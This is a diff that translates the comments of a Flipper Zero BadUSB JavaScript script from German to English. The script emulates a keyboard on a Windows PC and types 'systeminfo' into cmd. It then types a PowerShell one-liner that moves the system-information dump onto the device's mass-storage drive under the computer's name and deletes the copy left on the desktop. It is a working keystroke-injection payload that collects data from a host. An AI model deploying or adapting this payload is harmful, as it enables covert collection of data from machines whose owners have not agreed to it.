@@ -2,7 +2,7 @@
 //Version 1.1
 //Author: Christian Böö
 //
-//Dieses Script sammelt Systeminformationen und speichert sie als txt-File auf dem Flipper Zero USB-Stick
+//This Script collects System information and saves it as an txt-File on the Flipper Zero USB-Stick
 //
 
 //Requirements
@@ -13,68 +13,68 @@ let dialog = require("dialog");
 //Infos zum USB-Image
 let image = "/ext/apps_data/mass_storage/Cb.img";
 let size = 8 * 1024 * 1024; // 8 MB
-//Tastaturspracheinstellungen
-//ACHTUNG MUSS ZU DEN PC EINSTELLUNGEN PASSEN
+//Keyboard language settings
+//ATTENTION MUST MATCH THE PC SETTINGS
 let layout = "de-DE";
 
-// Check ob Image vorhanden
-print("Suche Image Datei...");
+// Check if Image available
+print("Search Image File...");
 if (storage.exists(image)) {
-    print("Datei existiert.");
+    print("File exists.");
 } else {
-    print("Image erstellen...");
+    print("Create Image...");
     usbdisk.createImage(image, size);
 }
 
-// BadUSB-verbindung herstellen mit dem unter "layout" definierten Layout
+// Establish BadUSB connection with the layout defined under "layout"
 badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });
-print("Warte auf verbindung....");
+print("Wait for connection....");
 while (!badusb.isConnected()) {
     delay(1000);
 }
 
-dialog.message("Systeminfos lesen", "OK zum Starten");
+dialog.message("Collect System information?", "Press OK to start");
 
-//Ausführen öffnen
-print ("Ausfuehren oeffnen...");
+//Open Run
+print ("Open run...");
 badusb.press("GUI","r");
 delay(500);
 
-//cmd eingeben - println führt automatisch Enter aus
-print ("CMD tippen...");
+//Write cmd - an rund println
+print ("Write CMD...");
 badusb.println("cmd");
 delay(500);
 
-//zum Desktop wechseln
-print ("zum Desktop....");
+//go to Desktop
+print ("Go to Desktop....");
 badusb.println("cd Desktop");
 delay (500);
 
-//systeminfo ausführen und in sysinfo.txt schreiben
-print ("Infos sammeln.....");
+//run systeminfo an write it into sysinfo.txt
+print ("Collect information.....");
 badusb.println("systeminfo > sysinfo.txt");
-delay (3000);
+delay (5000);
 
-//cmd schließen
-print ("CMD schlieszen.....");
+//close cmd
+print ("Close CMD.....");
 badusb.press("ALT","F4");
 delay (500);
 
-//powershell öffnen
-print ("Powershell oeffnen....");
+//open powershell
+print ("Open Powershell....");
 badusb.press("GUI","r");
 delay (500);
 badusb.println("powershell");
 delay (500);
-//powershell wartet jetzt 30 sekunden bis flipper usb-stick geladen wurde und ermittelt den Laufwerksbuchstaben - kopiert die sysinfo.txt vom Desktop auf den Stick und löscht sie anschließend vom Desktop
-//wir müssen hier den badusb trennen und den stick verbinden
+//powershell now waits 30 seconds until the flipper usb stick has been loaded and determines the drive letter - copies the sysinfo.txt from the desktop to the stick and then deletes it from the desktop
+//we have to disconnect the badusb and connect the stick
 badusb.println("Start-Sleep 30; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Move-Item -Path C:\\Users\\${env:username}\\Desktop\\sysinfo.txt -Destination ${DriveLetter}:\\${env:computername}_sysinfo.txt; Remove-Item C:\\Users\\${env:username}\\Desktop\\sysinfo.txt; exit");
 badusb.quit();
-print ("Bad-USB trennen....");
+print ("Close Bad-USB connection....");
 delay (2000);
 usbdisk.start(image);
-print ("USB-Stick laden....");
-print ("Wenn Powershell geschlossen wurde, USB bitte auswerfen lassen.....");
+print ("Load USB-Stick....");
+print ("If Powershell has been closed, please eject the USB.....");
 
 while (!usbdisk.wasEjected()) {
     delay(1000);
@@ -82,4 +82,4 @@ while (!usbdisk.wasEjected()) {
 
 // Stop
 usbdisk.stop();
-print("Fertig!");
+print("Done!");
